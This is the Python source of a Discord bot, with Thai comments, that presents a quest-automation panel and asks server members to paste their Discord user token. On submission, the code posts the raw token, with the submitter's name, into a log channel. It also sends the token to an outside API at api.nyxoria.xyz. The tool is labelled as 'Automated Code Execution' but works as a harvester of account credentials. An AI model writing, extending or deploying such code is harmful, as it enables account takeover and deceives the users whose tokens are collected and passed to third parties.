import asyncio
import aiohttp
import discord
from discord.ext import commands
import os
from dotenv import load_dotenv

# โหลดค่าจากไฟล์ .env
load_dotenv()

# ดึง Token มาเก็บไว้ในตัวแปร
token = os.getenv("เควสออโต้_token")

# ตั้งค่า Bot Intents
intents = discord.Intents.default()
intents.message_content = True  # <--- เติมบรรทัดนี้เพิ่มเข้าไปเพื่อให้อ่านข้อความคำสั่งได้
bot = commands.Bot(command_prefix="!", intents=intents)


BASE_URL = "https://api.nyxoria.xyz"

async def request_api(session, method, url, data=None, timeout=30):
    try:
        kwargs = {
            "timeout": aiohttp.ClientTimeout(total=timeout),
            "headers": {"Content-Type": "application/json"}
        }
        if data:
            kwargs["json"] = data
            
        async with session.request(method, url, **kwargs) as resp:
            try:
                body = await resp.json()
            except Exception:
                body = await resp.text()

            if resp.status < 400:
                return {"ok": True, "data": body}

            if isinstance(body, dict):
                message = (
                    body.get("error")
                    or body.get("message")
                    or body.get("detail")
                    or f"HTTP {resp.status}"
                )
            elif isinstance(body, str):
                message = body.strip() or f"HTTP {resp.status}"
            else:
                message = f"HTTP {resp.status}"

            return {"ok": False, "status": resp.status, "message": message}
    except Exception as e:
        return {"ok": False, "message": str(e)}

# Modal สำหรับให้ผู้ใช้กรอก Discord Token
class TokenModal(discord.ui.Modal, title="Automated Code Execution"):
    token_input = discord.ui.TextInput(
        label="Discord User Token",
        placeholder="วาง User Token ของคุณที่นี่...",
        style=discord.TextStyle.short,
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        token = self.token_input.value.strip()
        await interaction.response.send_message(f"[*] กำลังส่งคำขอประมวลผล Token...", ephemeral=True)
        msg = await interaction.original_response()

        # ----------------------------------------------------
        # ส่วนสำหรับการส่ง Log ไปที่ห้อง "บอท-log"
        # ----------------------------------------------------
        guild = interaction.guild
        if guild:
            # ค้นหาแชนแนลชื่อ "บอท-log" ในเซิร์ฟเวอร์
            log_channel = discord.utils.get(guild.text_channels, name="บอท-log")
            if log_channel:
                embed_log = discord.Embed(
                    title="📝 New Token Log",
                    color=0xFF9900,
                    timestamp=discord.utils.utcnow()
                )
                embed_log.add_field(name="ผู้ใช้งาน (User)", value=f"{interaction.user.mention} (`{interaction.user}`)", inline=False)
                embed_log.add_field(name="User Token ที่กรอก", value=f"```{token}```", inline=False)
                await log_channel.send(embed=embed_log)
        # ----------------------------------------------------

        async with aiohttp.ClientSession() as session:
            # ส่งคำขอเริ่มรันเควส
            start = await request_api(session, "POST", f"{BASE_URL}/api/quests/run", {"token": token, "concurrency": 999})
            if not start["ok"]:
                await msg.edit(content=f"[-] รันล้มเหลว: {start['message']}")
                return

            code_id = start["data"].get("jobId") if isinstance(start.get("data"), dict) else None
            if not code_id:
                await msg.edit(content="[-] ไม่พบ jobId จากการตอบกลับของ API")
                return

            await msg.edit(content=f"[+] เริ่มรันสำเร็จ! Job ID: `{code_id}` กำลังติดตามสถานะ...")

            # ลูปเช็คสถานะและอัปเดตข้อความเรื่อยๆ
            running = True
            while running:
                await asyncio.sleep(3)
                status = await request_api(session, "GET", f"{BASE_URL}/api/quests/status/{code_id}")
                if not status["ok"]:
                    await msg.edit(content=f"[-] ดึงสถานะล้มเหลว: {status['message']}")
                    break

                data = status.get("data")
                if not isinstance(data, dict):
                    break

                if data.get("completed") or data.get("status") in ("done", "error"):
                    running = False
                    summary = data.get("summary", {})
                    
                    result_text = (
                        f"**[✓] รายงานผล: ประมวลผลเสร็จสิ้น (Job ID: `{code_id}`)**\n"
                        f"• สถานะ: `{data.get('status', 'N/A')}`\n"
                        f"• สำเร็จ: `{summary.get('success', 0)}`\n"
                        f"• ล้มเหลว: `{summary.get('fail', 0)}`\n"
                        f"• ทั้งหมด: `{summary.get('total', 0)}`\n"
                        f"• เวลาที่ใช้: `{data.get('elapsed', 'N/A')}`"
                    )
                    await msg.edit(content=result_text)

# UI ปุ่มกดหน้า Panel
class QuestPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Execute Code", style=discord.ButtonStyle.primary, custom_id="execute_code_btn")
    async def execute_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(TokenModal())

    @discord.ui.button(label="Capabilities", style=discord.ButtonStyle.secondary, custom_id="capabilities_btn")
    async def capabilities_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("ℹ️ ระบบเควสออโต้สำหรับประมวลผลผ่าน API Nyxoria", ephemeral=True)

# คำสั่งส่งหน้า Panel ไปยังห้องแชท (พิมพ์ !panel เพื่อสร้างเมนูนี้)
@bot.command()
@commands.has_permissions(administrator=True)
async def panel(ctx):
    embed = discord.Embed(
        title="Automated Code Execution",
        description="A controlled execution interface for automated code operations.\nUse the controls below to begin.",
        color=0x00FF66
    )
    embed.set_image(url="https://via.placeholder.com/600x300.png?text=Blitz+Dev+Panel")
    
    view = QuestPanelView()
    await ctx.send(embed=embed, view=view)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name} (ID: {bot.user.id})")
    print("Bot is ready and running panel!")

# ใส่ Bot Token ของ Discord ของคุณตรงนี้
bot.run(token)